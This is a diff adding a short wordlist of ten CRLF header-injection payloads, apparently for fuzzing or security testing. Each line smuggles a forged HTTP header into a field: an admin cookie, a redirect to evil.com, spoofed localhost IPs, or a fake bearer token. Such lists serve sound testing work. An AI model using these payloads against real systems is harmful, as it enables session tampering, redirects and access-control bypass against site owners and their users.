@@ -1,0 +1,10 @@
+%0d%0aX-Injected:1
+%0d%0aX-Forwarded-For:127.0.0.1
+%0d%0aSet-Cookie:admin=true
+%0d%0aLocation:https://evil.com
+%0d%0aContent-Type:text/html
+%0d%0aX-Admin:true
+%0d%0aX-Debug:true
+%0d%0aX-Host:evil.com
+%0d%0aX-Real-IP:127.0.0.1
+%0d%0aAuthorization:Bearer evil
